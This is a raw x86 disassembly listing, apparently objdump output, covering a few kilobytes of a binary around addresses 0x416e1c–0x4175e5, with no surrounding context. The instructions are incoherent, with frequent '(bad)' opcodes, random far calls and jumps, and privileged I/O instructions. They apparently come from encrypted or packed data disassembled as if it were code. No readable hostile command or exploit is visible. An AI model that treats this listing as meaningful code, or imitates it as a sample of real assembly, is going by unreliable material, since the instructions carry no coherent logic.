  416e1c:	rcl    BYTE PTR [eax],0xcc
  416e1f:	pop    ecx
  416e20:	(bad)  
  416e21:	inc    eax
  416e22:	dec    ecx
  416e23:	(bad)  
  416e25:	nop
  416e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e27:	into   
  416e28:	sbb    BYTE PTR [edx+0x21],dl
  416e2b:	xchg   DWORD PTR [eax],eax
  416e2d:	inc    ebx
  416e2e:	dec    ecx
  416e2f:	xchg   ecx,eax
  416e30:	sbb    eax,0x442847fb
  416e35:	sti    
  416e36:	lods   al,BYTE PTR ds:[esi]
  416e37:	leave  
  416e38:	inc    esi
  416e39:	mov    al,0x50
  416e3b:	outs   dx,BYTE PTR ds:[esi]
  416e3c:	cwde   
  416e3d:	jns    0x416de6
  416e3f:	mov    bl,0x99
  416e41:	xor    al,0x4a
  416e43:	mov    ebx,0x711638
  416e48:	xchg   ebp,eax
  416e49:	and    bl,0x69
  416e4c:	mov    ch,0x9
  416e4e:	test   BYTE PTR [eax],bh
  416e50:	outs   dx,BYTE PTR ds:[esi]
  416e51:	xchg   BYTE PTR [ecx+0x3b],bl
  416e54:	add    BYTE PTR [edi+0x7e],al
  416e57:	mov    al,0xbe
  416e59:	popa   
  416e5a:	retf   
  416e5b:	aad    0x2a
  416e5d:	mov    edx,0xd5141963
  416e62:	xor    DWORD PTR [ecx],edi
  416e64:	xor    esi,DWORD PTR [edx-0xf]
  416e67:	push   esp
  416e68:	cld    
  416e69:	sbb    ch,BYTE PTR [ebx-0x19]
  416e6c:	xchg   ecx,eax
  416e6d:	outs   dx,DWORD PTR ds:[esi]
  416e6e:	fiadd  DWORD PTR [esi-0x2fbcd0f9]
  416e74:	(bad)  
  416e75:	aad    0xff
  416e77:	mov    WORD PTR [eax+ecx*1+0x45b38730],?
  416e7e:	or     ah,BYTE PTR [edx+0x50]
  416e81:	xor    eax,0x2cc4ca5e
  416e86:	sbb    al,0x70
  416e88:	mov    ah,0xf1
  416e8a:	call   0x5fe7:0x4af4e7ef
  416e91:	aam    0x2c
  416e93:	adc    DWORD PTR [esi-0x5a555cf5],ecx
  416e99:	inc    ebx
  416e9a:	mov    ah,0x5d
  416e9c:	pop    eax
  416e9d:	mov    eax,ds:0x59b35e65
  416ea2:	mov    esp,0xd024ba92
  416ea7:	or     BYTE PTR [ebx-0x35340b1f],ah
  416ead:	pop    ss
  416eae:	dec    esp
  416eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eb0:	daa    
  416eb1:	stc    
  416eb2:	add    BYTE PTR [ecx],bl
  416eb4:	pop    edx
  416eb5:	or     eax,0x6efc4ce9
  416eba:	(bad)  
  416ebb:	js     0x416f26
  416ebd:	push   ds
  416ebe:	fst    DWORD PTR [eax+0x4b29e996]
  416ec4:	pop    ecx
  416ec5:	sub    al,0x8f
  416ec7:	xor    bh,bh
  416ec9:	retf   0xb260
  416ecc:	outs   dx,DWORD PTR ds:[esi]
  416ecd:	push   esi
  416ece:	add    ebp,ecx
  416ed0:	push   ds
  416ed1:	sub    eax,0xfe7f3555
  416ed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ed7:	dec    ebp
  416ed8:	jmp    DWORD PTR [edx+0x5982b7f6]
  416ede:	call   DWORD PTR [esi]
  416ee0:	into   
  416ee1:	shl    BYTE PTR ds:0xc086723e,cl
  416ee7:	repz xor eax,0xe988333f
  416eed:	pop    ecx
  416eee:	(bad)  
  416eef:	out    0x6f,al
  416ef1:	jp     0x416ea7
  416ef3:	mov    edx,0x7d98cd6e
  416ef8:	nop
  416ef9:	cdq    
  416efa:	daa    
  416efb:	fdivr  QWORD PTR [ecx+0x61]
  416efe:	mov    dl,0x16
  416f00:	repz pop ss
  416f02:	enter  0xa8b4,0x48
  416f06:	pop    ds
  416f07:	in     eax,dx
  416f08:	mov    dl,al
  416f0a:	xlat   BYTE PTR ds:[ebx]
  416f0b:	cmovb  edi,esi
  416f0e:	pop    ebx
  416f0f:	gs push 0x6623187d
  416f15:	or     eax,0xcccdf024
  416f1a:	stos   BYTE PTR es:[edi],al
  416f1b:	add    esi,DWORD PTR [ebx+0x35795ef9]
  416f21:	jbe    0x416f28
  416f23:	inc    ecx
  416f24:	(bad)  
  416f25:	fdiv   DWORD PTR [ebp+0x1c268237]
  416f2b:	aad    0x87
  416f2d:	mov    al,0xcb
  416f2f:	fadd   QWORD PTR [esi-0x4cb9cf86]
  416f35:	repz push 0x2c
  416f38:	int    0x94
  416f3a:	inc    ebx
  416f3b:	stos   BYTE PTR es:[edi],al
  416f3c:	sbb    DWORD PTR [edi-0x54],eax
  416f3f:	jbe    0x416ec5
  416f41:	xchg   esi,eax
  416f42:	aas    
  416f43:	xor    bh,bl
  416f45:	xor    al,0x18
  416f47:	(bad)  
  416f48:	out    dx,eax
  416f49:	sti    
  416f4a:	lods   al,BYTE PTR ds:[esi]
  416f4b:	bound  ebp,QWORD PTR [ebp-0x7bed01ba]
  416f51:	xchg   DWORD PTR [ebp+0x3f2adbfd],esp
  416f57:	adc    DWORD PTR [esi+eax*8-0x4e7e8ba9],esp
  416f5e:	pusha  
  416f5f:	sub    dh,BYTE PTR [esp+edx*2+0x62]
  416f63:	inc    eax
  416f64:	sbb    esi,DWORD PTR [ecx*1+0x2e6c9da1]
  416f6b:	push   edi
  416f6c:	(bad)  [ebp+0x39a47499]
  416f72:	sbb    esp,DWORD PTR [ebp+0x2b]
  416f75:	ret    
  416f76:	test   DWORD PTR [ebx+0x44],edi
  416f79:	shr    al,cl
  416f7b:	or     al,0x79
  416f7d:	shl    DWORD PTR [edx+0x3f],1
  416f80:	mov    edi,0x84a0fc03
  416f85:	ins    DWORD PTR es:[edi],dx
  416f86:	xchg   ecx,eax
  416f87:	jecxz  0x417004
  416f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f8a:	xchg   edx,eax
  416f8b:	adc    eax,0x9828af51
  416f90:	xchg   ebx,eax
  416f91:	sar    DWORD PTR [ebx+0x7d561c45],0xe8
  416f98:	cdq    
  416f99:	aam    0x1
  416f9b:	hlt    
  416f9c:	sti    
  416f9d:	arpl   WORD PTR [ebx+0x40ad18c0],di
  416fa3:	retf   
  416fa4:	mov    edx,0x19e2664f
  416fa9:	int3   
  416faa:	sub    ecx,DWORD PTR [edx]
  416fac:	xchg   BYTE PTR [edx],ch
  416fae:	out    0xb6,al
  416fb0:	push   edi
  416fb1:	dec    eax
  416fb2:	fnsave [eax-0x6e]
  416fb5:	xor    DWORD PTR [edi],ecx
  416fb7:	shl    BYTE PTR [esi+edi*8-0x1318c3e3],1
  416fbe:	add    BYTE PTR [edx+0x5f9e14e7],0x72
  416fc5:	dec    edx
  416fc6:	mov    edx,0x45ba03f3
  416fcb:	pop    ebp
  416fcc:	push   eax
  416fcd:	jbe    0x416fb4
  416fcf:	imul   eax,DWORD PTR [ebx+0x37],0x58bb4f64
  416fd6:	mov    es,edx
  416fd8:	adc    eax,0x717f231c
  416fdd:	mov    ah,0x2e
  416fdf:	push   edi
  416fe0:	sar    BYTE PTR [edx+edi*1],cl
  416fe3:	lds    eax,FWORD PTR [ecx]
  416fe5:	scas   al,BYTE PTR es:[edi]
  416fe6:	cmp    al,0x7d
  416fe8:	pop    ecx
  416fe9:	inc    eax
  416fea:	out    0x13,al
  416fec:	jae    0x41705d
  416fee:	push   ecx
  416fef:	bound  ebx,QWORD PTR [edi]
  416ff1:	lds    ebp,FWORD PTR [esi+0x23]
  416ff4:	cmp    cl,dh
  416ff6:	out    dx,eax
  416ff7:	mov    bl,0xe5
  416ff9:	and    eax,0x1b343fe4
  416ffe:	mov    edx,0xe4d70628
  417003:	ins    BYTE PTR es:[edi],dx
  417004:	mov    edx,0xc0c80a56
  417009:	push   es
  41700a:	xchg   esi,eax
  41700b:	(bad)  
  41700c:	shl    BYTE PTR [ebx+ebp*8],0x69
  417010:	push   eax
  417011:	(bad)
  417016:	cmc    
  417017:	jne    0x416f9f
  417019:	mov    ds,ebp
  41701b:	inc    edi
  41701c:	lahf   
  41701d:	(bad)  
  41701e:	and    DWORD PTR [edi],ecx
  417020:	push   ss
  417021:	jle    0x417038
  417023:	inc    edx
  417024:	fcom   QWORD PTR [esi-0x35f708c8]
  41702a:	mov    al,ds:0x55adfbb9
  41702f:	and    BYTE PTR [edi],ah
  417031:	mov    bl,BYTE PTR [edx+ecx*2+0x70]
  417035:	popf   
  417036:	inc    esi
  417037:	sub    ch,cl
  417039:	das    
  41703a:	and    BYTE PTR [ecx-0x24d949f1],cl
  417040:	mov    ecx,0x461a2ae2
  417045:	or     bh,al
  417047:	sti    
  417048:	scas   al,BYTE PTR es:[edi]
  417049:	pop    esi
  41704a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41704b:	xchg   edx,eax
  41704c:	repnz mov eax,0x8fc42443
  417052:	int3   
  417053:	(bad)  
  417055:	adc    al,0x3a
  417057:	inc    edx
  417058:	sti    
  417059:	ret    0x5a77
  41705c:	xchg   edi,eax
  41705d:	ins    DWORD PTR es:[edi],dx
  41705e:	adc    esp,DWORD PTR [esi-0x443debf5]
  417064:	add    DWORD PTR [esi],ecx
  417066:	into   
  417067:	loop   0x41702b
  417069:	push   esi
  41706a:	addr16 pusha 
  41706c:	pop    es
  41706d:	fsub   st,st(3)
  41706f:	dec    ebx
  417070:	xchg   esi,eax
  417071:	pop    esp
  417072:	xchg   esp,eax
  417073:	fs push ss
  417075:	sub    edx,ebx
  417077:	jns    0x41703f
  417079:	cs mov ch,0x8f
  41707c:	cwde   
  41707d:	das    
  41707e:	sub    eax,0xd0a2e022
  417083:	or     al,0x29
  417085:	fsubr  DWORD PTR [ebx+0x9]
  417088:	push   DWORD PTR [ebp+0x64]
  41708b:	sub    BYTE PTR [edx],ah
  41708d:	(bad)  
  41708e:	mov    ebp,0x3097064d
  417093:	js     0x4170a4
  417095:	(bad)  
  417096:	xchg   ebp,eax
  417097:	add    al,0xec
  417099:	mov    WORD PTR [ebx],es
  41709b:	xlat   BYTE PTR ds:[ebx]
  41709c:	xor    al,0x7b
  41709e:	xor    eax,DWORD PTR [ecx-0xeec0f31]
  4170a4:	lock jecxz 0x417046
  4170a7:	dec    edx
  4170a8:	adc    BYTE PTR [edx-0x71],bh
  4170ab:	lahf   
  4170ac:	jae    0x4170bc
  4170ae:	out    0x5c,eax
  4170b0:	xor    al,0x53
  4170b2:	loop   0x41709e
  4170b4:	jae    0x4170e2
  4170b6:	leave  
  4170b7:	call   FWORD PTR [ecx+0x635ba417]
  4170bd:	mov    ch,0x4c
  4170bf:	mov    bl,0xad
  4170c1:	xor    DWORD PTR [esi+0x13],ebp
  4170c4:	inc    edi
  4170c5:	arpl   WORD PTR [ecx],cx
  4170c7:	gs mov edx,0x8f71570a
  4170cd:	xchg   ebp,esp
  4170cf:	dec    eax
  4170d0:	ret    0x9f1d
  4170d3:	jno    0x4170be
  4170d5:	jbe    0x4170a3
  4170d7:	push   esp
  4170d8:	push   0x899da09d
  4170dd:	push   ebp
  4170de:	or     DWORD PTR [edi-0x243309eb],esi
  4170e4:	fsubr  DWORD PTR [edx]
  4170e6:	test   eax,0x8c30d44c
  4170eb:	arpl   WORD PTR [edx],ax
  4170ed:	lahf   
  4170ee:	xor    edx,DWORD PTR ds:0x5f8b5c63
  4170f4:	inc    ebx
  4170f5:	ins    BYTE PTR es:[edi],dx
  4170f6:	retf   0xcf76
  4170f9:	xchg   esp,eax
  4170fa:	aad    0x60
  4170fc:	add    esp,DWORD PTR [ebx-0x3a18f911]
  417102:	sub    BYTE PTR [eax+ebp*1],dh
  417105:	push   edx
  417106:	lods   eax,DWORD PTR ds:[esi]
  417107:	loopne 0x4170cf
  417109:	push   ss
  41710a:	sbb    eax,0x4733af83
  41710f:	push   edx
  417110:	or     DWORD PTR [edx+ebp*4],0xffffffa3
  417114:	cld    
  417115:	into   
  417116:	test   al,0xe1
  417118:	ins    DWORD PTR es:[edi],dx
  417119:	push   ss
  41711a:	or     bl,bl
  41711c:	jbe    0x4170de
  41711e:	stos   DWORD PTR es:[edi],eax
  41711f:	rcl    BYTE PTR [eax+0x6428ae6b],0xd5
  417126:	shl    DWORD PTR [ebp-0x7a],1
  417129:	and    eax,0x1a4d68c6
  41712e:	and    esi,edi
  417130:	packsswb mm5,QWORD PTR [edi-0x1bf2b667]
  417137:	lahf   
  417138:	pop    esi
  417139:	jmp    0x4171b1
  41713b:	pop    ds
  41713c:	fnsave [ebx-0x49]
  41713f:	sub    eax,ebp
  417141:	outs   dx,BYTE PTR ds:[esi]
  417142:	pop    ebx
  417143:	push   edi
  417144:	clc    
  417145:	or     BYTE PTR ds:0x786df6b7,cl
  41714b:	daa    
  41714c:	std    
  41714d:	ins    DWORD PTR es:[edi],dx
  41714e:	popa   
  41714f:	mov    dl,0x24
  417151:	iret   
  417152:	repnz cmp al,0x19
  417155:	adc    al,0x3f
  417157:	jae    0x4171b2
  417159:	pop    ebx
  41715a:	sahf   
  41715b:	push   ds
  41715c:	mov    al,0x4
  41715e:	cmp    ebp,DWORD PTR gs:[edi+0x20]
  417162:	jg     0x4171a5
  417164:	retf   
  417165:	call   0x8398:0x743a95f6
  41716c:	mov    ds,ecx
  41716e:	aaa    
  41716f:	sbb    ch,dl
  417171:	xor    eax,DWORD PTR [edi*1-0x30609433]
  417178:	add    eax,0x3ebdef82
  41717d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41717e:	adc    DWORD PTR [esi],edx
  417180:	jmp    0x41710b
  417182:	dec    esp
  417183:	sar    DWORD PTR [esi+0xe1afb95],1
  417189:	push   edx
  41718a:	and    bh,BYTE PTR [ecx+0x10249cb4]
  417190:	ss dec esi
  417192:	mov    ds:0xc4cb33f,al
  417197:	dec    ebx
  417198:	(bad)  
  417199:	arpl   WORD PTR [ecx],sp
  41719b:	mov    dl,0xfd
  41719d:	sbb    al,0x74
  41719f:	js     0x4171d4
  4171a1:	and    bh,al
  4171a3:	mov    ebp,0xda944cbc
  4171a8:	push   0xffffffd5
  4171aa:	pop    ss
  4171ab:	adc    BYTE PTR [eax],dl
  4171ad:	and    ch,al
  4171af:	mov    ecx,DWORD PTR [ebx+0x4c702bca]
  4171b5:	mov    ecx,DWORD PTR [edx-0x7c]
  4171b8:	mov    gs,WORD PTR [ecx+eax*1-0x3d]
  4171bc:	pop    ss
  4171bd:	mov    ds:0x5f2c7949,eax
  4171c2:	cli    
  4171c3:	dec    eax
  4171c4:	cld    
  4171c5:	sub    eax,0x8ae6f201
  4171ca:	fdiv   DWORD PTR [edi-0x1eddd281]
  4171d0:	imul   ebx,DWORD PTR [edi-0xfbcdf63],0xd11f4262
  4171da:	into   
  4171db:	js     0x41717a
  4171dd:	test   al,0x87
  4171df:	imul   eax,DWORD PTR [edi],0xfffffff0
  4171e2:	mov    ds:0xf01510b1,eax
  4171e7:	sbb    BYTE PTR [esi+0x68],ch
  4171ea:	inc    ebp
  4171eb:	or     esi,ebp
  4171ed:	inc    edi
  4171ee:	retf   
  4171ef:	outs   dx,DWORD PTR ds:[esi]
  4171f0:	popf   
  4171f1:	(bad)  
  4171f2:	test   eax,0x531047ca
  4171f7:	mov    al,0xf5
  4171f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171fa:	xchg   esp,eax
  4171fb:	aas    
  4171fc:	adc    al,0x47
  4171fe:	test   DWORD PTR [ebx],edi
  417200:	cmp    eax,0x5705e281
  417205:	jnp    0x417248
  417207:	mov    dl,0xcb
  417209:	or     al,0x29
  41720b:	scas   al,BYTE PTR es:[edi]
  41720c:	add    BYTE PTR [ebx-0x49bff5e5],bh
  417212:	ja     0x4171af
  417214:	jb     0x417264
  417216:	push   ebx
  417217:	jae    0x417272
  417219:	sub    WORD PTR [eiz*2+0x160c60c6],si
  417221:	add    BYTE PTR [eax+0x56],0x14
  417225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417226:	dec    edx
  417227:	or     BYTE PTR [esi],ah
  417229:	add    bl,BYTE PTR [ebp-0x72]
  41722c:	add    dl,BYTE PTR [eax-0x65]
  41722f:	push   ebx
  417230:	jge    0x4172a1
  417232:	shr    ch,0x31
  417235:	repnz and DWORD PTR [esi],ecx
  417238:	pop    edi
  417239:	cmp    eax,0x402d758b
  41723e:	out    dx,eax
  41723f:	add    ch,dl
  417241:	imul   ebp,DWORD PTR [eax+0xdf3115f],0xd6bbe3cf
  41724b:	xchg   ecx,eax
  41724c:	(bad)  
  41724d:	jle    0x4172b8
  41724f:	adc    bh,BYTE PTR [esi]
  417251:	cmp    eax,0x25b4528e
  417256:	mov    edx,0x29e5bae9
  41725b:	mov    ?,ebp
  41725d:	fnstcw WORD PTR [esi-0x1eb367af]
  417263:	adc    BYTE PTR [bp+0x6e],0x92
  417268:	lea    eax,[esi+0x7c6b6e47]
  41726e:	adc    DWORD PTR [edx+0x23],eax
  417271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417272:	fucomi st,st(6)
  417274:	mov    edx,ebx
  417276:	push   esp
  417277:	popf   
  417278:	dec    ecx
  417279:	cmp    eax,0x2eae60e9
  41727e:	arpl   sp,sp
  417280:	push   0x78
  417282:	in     eax,dx
  417283:	pop    ds
  417284:	jns    0x417228
  417286:	cmp    DWORD PTR [esi-0x28],0x970ad0c9
  41728d:	stc    
  41728e:	sub    ecx,0x28
  417291:	sbb    al,0x82
  417293:	xchg   edx,eax
  417294:	xchg   ecx,eax
  417295:	ret    0x77c4
  417298:	jne    0x417234
  41729a:	shl    esi,0xe5
  41729d:	pop    eax
  41729e:	ficomp DWORD PTR [esp+edi*8]
  4172a1:	ror    DWORD PTR [edx+0x1f],1
  4172a4:	inc    ecx
  4172a5:	mov    al,0x2a
  4172a7:	lahf   
  4172a8:	inc    ebx
  4172a9:	retf   
  4172aa:	mov    eax,ds:0x16f88ec2
  4172af:	mov    ds:0xf437b80f,al
  4172b4:	(bad)  
  4172b5:	pusha  
  4172b6:	(bad)
  4172b9:	ss pop ebx
  4172bb:	mov    eax,0xee018563
  4172c0:	xor    eax,0xb5a2263e
  4172c5:	xchg   ecx,eax
  4172c6:	jecxz  0x41726a
  4172c8:	out    0x41,al
  4172ca:	push   0x801b64ea
  4172cf:	mov    dh,0x54
  4172d1:	pop    esi
  4172d2:	push   0xcbc07714
  4172d7:	push   es
  4172d8:	mov    ebx,DWORD PTR [edi-0x28c924fd]
  4172de:	dec    esp
  4172df:	scas   eax,DWORD PTR es:[edi]
  4172e0:	jmp    0x41732a
  4172e2:	pop    ebp
  4172e3:	repz jmp 0x3a5e3d59
  4172e9:	xchg   ecx,eax
  4172ea:	or     edx,DWORD PTR [esi-0x186db149]
  4172f0:	arpl   di,bx
  4172f2:	push   ss
  4172f3:	leave  
  4172f4:	pop    edx
  4172f5:	adc    DWORD PTR [edx+0xe],esi
  4172f8:	outs   dx,DWORD PTR ds:[esi]
  4172f9:	hlt    
  4172fa:	mov    bh,0xa7
  4172fc:	xchg   esp,eax
  4172fd:	shl    dh,0xc0
  417300:	test   eax,0xbd61b472
  417305:	mov    cl,BYTE PTR [ebx-0x721a432f]
  41730b:	mov    WORD PTR [esi+0x79cff4e6],?
  417311:	mov    al,0x7a
  417314:	mov    ah,0x2f
  417316:	popa   
  417317:	cld    
  417318:	cmp    eax,0xdd773a25
  41731d:	mov    eax,ds:0x5c135fc0
  417322:	into   
  417323:	or     al,0x69
  417325:	xchg   ecx,eax
  417326:	retf   
  417327:	into   
  417328:	stos   DWORD PTR es:[edi],eax
  417329:	imul   BYTE PTR [edi]
  41732b:	push   eax
  41732c:	outs   dx,DWORD PTR ds:[esi]
  41732d:	sub    DWORD PTR [edi],ebp
  41732f:	fmul   st,st(0)
  417331:	shl    BYTE PTR [ebp-0x46],1
  417334:	imul   esi,ecx,0x2e0e5668
  41733a:	mov    ebp,0x9e7f9763
  41733f:	dec    esi
  417340:	inc    edi
  417341:	(bad)  
  417342:	cmp    BYTE PTR [edx],al
  417344:	inc    eax
  417345:	imul   ecx,ebx,0xffffffbe
  417348:	jmp    0x3915e43e
  41734d:	jg     0x4173ab
  41734f:	jg     0x4173b4
  417351:	das    
  417352:	outs   dx,DWORD PTR ds:[esi]
  417353:	or     DWORD PTR [esi+eiz*1+0x715dd098],ecx
  41735a:	pop    ebx
  41735b:	jmp    0xaf7f:0xfc2fcf7c
  417362:	xor    eax,0xf138aa62
  417367:	pop    esp
  417368:	fldenv [eax]
  41736a:	sbb    BYTE PTR [ecx],dh
  41736c:	fdiv   QWORD PTR [ebx]
  41736e:	pop    eax
  41736f:	mov    bl,al
  417371:	mov    ah,0x54
  417373:	pop    ebp
  417374:	sub    eax,0x8193663c
  417379:	mov    dh,0xe3
  41737b:	jo     0x4173a7
  41737d:	(bad)  
  41737e:	dec    esp
  41737f:	in     al,0x6b
  417381:	pop    edi
  417382:	xor    al,0x5b
  417384:	jmp    0xaebdd1ab
  417389:	inc    ebp
  41738a:	push   edx
  41738b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41738c:	cdq    
  41738d:	inc    esp
  41738e:	mov    ds:0x46cf5d5e,eax
  417393:	cwde   
  417394:	push   esp
  417395:	and    bl,BYTE PTR [ecx+0x40]
  417398:	push   ecx
  417399:	aam    0x50
  41739b:	cli    
  41739c:	add    edx,ebx
  41739e:	inc    esp
  41739f:	lds    ebx,FWORD PTR [ecx]
  4173a1:	cmc    
  4173a2:	mov    ebp,0x751e07d5
  4173a7:	jp     0x4173de
  4173a9:	jne    0x417355
  4173ab:	or     DWORD PTR [ebp+0x5e],0xffffffbe
  4173af:	dec    esi
  4173b0:	into   
  4173b1:	jae    0x417391
  4173b3:	mov    eax,DWORD PTR [edi+ebp*4+0x67]
  4173b7:	jb     0x41737a
  4173b9:	mov    cl,0xc6
  4173bb:	fldcw  WORD PTR [esi]
  4173bd:	cmp    eax,0xe9a63115
  4173c2:	cld    
  4173c3:	jecxz  0x4173b1
  4173c5:	mov    al,ds:0xef183a6a
  4173ca:	cmp    esi,DWORD PTR [esi+0x4e]
  4173cd:	adc    DWORD PTR [ebp-0x8cf7ae8],0xa4fe937e
  4173d7:	pop    DWORD PTR [eax]
  4173d9:	cmp    al,0x1c
  4173db:	ret    0xdb98
  4173de:	out    0x67,al
  4173e0:	inc    edx
  4173e1:	outs   dx,DWORD PTR ds:[esi]
  4173e2:	sbb    al,0x86
  4173e4:	cmp    BYTE PTR [eax+0xadc330f],al
  4173ea:	mov    ebp,0xc32f8220
  4173ef:	std    
  4173f0:	mov    esi,0x876c6840
  4173f5:	mov    bl,0xd
  4173f7:	cmp    DWORD PTR [edx+0x6ed41643],ebx
  4173fd:	fwait
  4173fe:	retf   0x7b27
  417401:	dec    edx
  417402:	aas    
  417403:	(bad)  
  417404:	cmc    
  417405:	cmp    bh,al
  417407:	ja     0x417431
  417409:	(bad)  
  41740a:	jmp    0x5bf96ebf
  41740f:	xchg   edi,eax
  417410:	neg    BYTE PTR [edx+0x27]
  417413:	rol    BYTE PTR [ebx],1
  417415:	or     BYTE PTR [ebp-0x5a],bh
  417418:	fs cs std 
  41741b:	nop
  41741c:	cmp    DWORD PTR [ecx+0x6f8b45a4],esi
  417422:	dec    esi
  417423:	out    dx,al
  417424:	rol    DWORD PTR [ebp+0x50],1
  417427:	addr16 add ch,cl
  41742a:	xchg   ebp,eax
  41742b:	repz aas 
  41742d:	ret    0x52ba
  417430:	sahf   
  417431:	sahf   
  417432:	cmp    DWORD PTR [ecx],0xffffffea
  417435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417436:	add    eax,0xf1b62f
  41743b:	and    al,0xd3
  41743d:	or     al,0x89
  41743f:	push   cs
  417440:	lds    ecx,FWORD PTR [ebx-0x17]
  417443:	hlt    
  417444:	cmp    ecx,edi
  417446:	inc    edi
  417447:	push   edx
  417448:	push   esi
  417449:	fistp  DWORD PTR [ecx-0x31c9827c]
  41744f:	test   DWORD PTR [edi-0xf],ebx
  417452:	(bad)  
  417454:	xor    edi,DWORD PTR [edx+esi*1-0x33]
  417458:	add    ebp,DWORD PTR [ebx+0x43]
  41745b:	in     al,0x6c
  41745d:	dec    esi
  41745e:	shl    eax,cl
  417460:	call   0xfab47c3
  417465:	xor    BYTE PTR [ecx-0x7d],cl
  417468:	jmp    0x4174c4
  41746a:	shl    BYTE PTR [ebp-0x61f210f5],0x14
  417471:	(bad)  
  417472:	lods   al,BYTE PTR ds:[esi]
  417473:	dec    ebp
  417474:	mov    ds:0xbe83113c,al
  417479:	test   ch,dh
  41747b:	test   eax,esp
  41747d:	into   
  41747e:	leave  
  41747f:	cmp    al,0xa5
  417481:	cdq    
  417482:	lea    ebp,[ecx+ecx*8-0x38ad8c57]
  417489:	scas   al,BYTE PTR es:[edi]
  41748a:	cmp    ch,dl
  41748c:	jnp    0x4174e9
  41748e:	call   FWORD PTR ds:0xc057ff75
  417494:	seta   BYTE PTR [eax+edi*2+0x37c4ab78]
  41749c:	scas   eax,DWORD PTR es:[edi]
  41749d:	dec    ecx
  41749e:	pusha  
  41749f:	cs mov esp,0x5e642aeb
  4174a5:	loope  0x417461
  4174a7:	push   ebx
  4174a8:	fs push edx
  4174aa:	test   eax,0x2cb9a224
  4174af:	nop
  4174b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b1:	int    0x5e
  4174b3:	mov    dh,0xc4
  4174b5:	inc    esi
  4174b6:	repz push ecx
  4174b8:	fisttp QWORD PTR [edx+0x61]
  4174bb:	aam    0x53
  4174bd:	js     0x417477
  4174bf:	mov    dh,0x80
  4174c1:	mov    dl,BYTE PTR [edx+0x7e]
  4174c4:	sub    eax,0x29c1ee2e
  4174c9:	popf   
  4174ca:	repnz or DWORD PTR [eax-0x6a],edx
  4174ce:	cmp    dh,BYTE PTR ds:0x2d2a5bc7
  4174d4:	rol    al,1
  4174d6:	bnd js 0x417527
  4174d9:	add    al,0xac
  4174db:	jge    0x4174b8
  4174dd:	pop    edi
  4174de:	icebp  
  4174df:	cld    
  4174e0:	mov    ch,0xa9
  4174e2:	mov    cl,0xd7
  4174e4:	push   0xffffffc4
  4174e6:	mov    eax,ds:0xe22e7990
  4174eb:	sub    ah,ch
  4174ed:	push   ebx
  4174ee:	xor    al,BYTE PTR [edi+esi*8+0x460a41ff]
  4174f5:	loope  0x417519
  4174f7:	sbb    dh,cl
  4174f9:	mov    bl,0x18
  4174fb:	and    al,0x35
  4174fd:	jno    0x41757d
  4174ff:	push   es
  417500:	xor    cl,dl
  417502:	outs   dx,DWORD PTR ds:[esi]
  417503:	call   0xa9f57438
  417508:	mov    ebx,0x678b8364
  41750d:	mov    eax,ds:0xa08782ce
  417512:	mov    esi,DWORD PTR [ebx]
  417514:	sar    BYTE PTR [edx],cl
  417516:	test   ah,dl
  417518:	xchg   BYTE PTR [ebx],dl
  41751a:	jne    0x417592
  41751c:	sub    DWORD PTR [ebx+0x6f],ebp
  41751f:	sub    ebp,DWORD PTR [ebx]
  417521:	fcomi  st,st(7)
  417523:	fld    st(2)
  417525:	mov    ebx,ebp
  417527:	mov    esp,0x1ea841b6
  41752c:	mov    dh,0x52
  41752e:	aam    0x96
  417530:	test   BYTE PTR [ebx+0x58],0x91
  417534:	cmp    al,0x5f
  417536:	pop    es
  417537:	pop    ds
  417538:	sbb    DWORD PTR [ebp+0x9e0533a],ecx
  41753e:	inc    edx
  41753f:	test   al,0xd0
  417541:	bound  ebx,QWORD PTR [ebp-0x1b]
  417544:	or     al,0xd9
  417546:	cmp    eax,0x695e5621
  41754b:	leave  
  41754c:	(bad)  
  41754d:	mov    al,BYTE PTR [ebp+0x9b9e791]
  417553:	(bad)
  417558:	pop    ecx
  417559:	mov    al,0x69
  41755b:	cmc    
  41755c:	and    bh,BYTE PTR [esi+0x38]
  41755f:	xor    esi,edi
  417561:	sbb    al,0x1e
  417563:	bound  esi,QWORD PTR ds:0x23072869
  417569:	test   DWORD PTR [ecx],edx
  41756b:	or     bl,BYTE PTR ds:0xc0cdf8d6
  417571:	mov    edi,0x70c30f48
  417576:	dec    edx
  417577:	inc    edi
  417578:	pop    eax
  417579:	not    ch
  41757b:	test   BYTE PTR cs:[ebp-0x35],bh
  41757f:	lock pusha 
  417581:	daa    
  417582:	shl    BYTE PTR [ecx-0x69572dfe],1
  417588:	call   0x2289:0x83ca0e13
  41758f:	sbb    ch,BYTE PTR [edx]
  417591:	hlt    
  417592:	add    DWORD PTR [ebp-0xb],ebx
  417595:	popf   
  417596:	push   ebx
  417597:	xchg   ecx,eax
  417598:	jno    0x41754a
  41759a:	arpl   WORD PTR [eax+0x55301c9e],si
  4175a0:	ficomp WORD PTR [esi+0x11]
  4175a3:	cmp    BYTE PTR [ecx-0x30a37a0a],al
  4175a9:	div    DWORD PTR [ebp-0x2d85a924]
  4175af:	pop    edx
  4175b0:	test   ebp,ecx
  4175b2:	adc    al,0xe8
  4175b4:	fstp   TBYTE PTR [ebp-0x16]
  4175b7:	push   0xaa6d0e5e
  4175bc:	popa   
  4175bd:	xchg   esi,eax
  4175be:	stc    
  4175bf:	call   0x88ad3276
  4175c4:	jl     0x417618
  4175c6:	adc    BYTE PTR [edi],dh
  4175c8:	xchg   esp,eax
  4175c9:	cli    
  4175ca:	sbb    edi,DWORD PTR [edi-0x37]
  4175cd:	cmp    BYTE PTR [edi+0x5d],dh
  4175d0:	test   DWORD PTR [ecx],esp
  4175d2:	fiadd  WORD PTR [esi]
  4175d4:	retf   
  4175d5:	mov    BYTE PTR [esi+0x66c2467c],bl
  4175db:	add    al,BYTE PTR [ecx-0x2e]
  4175de:	jmp    0x7487:0xe03f3111
  4175e5:	fmul   QWORD PTR [eax-0x70]
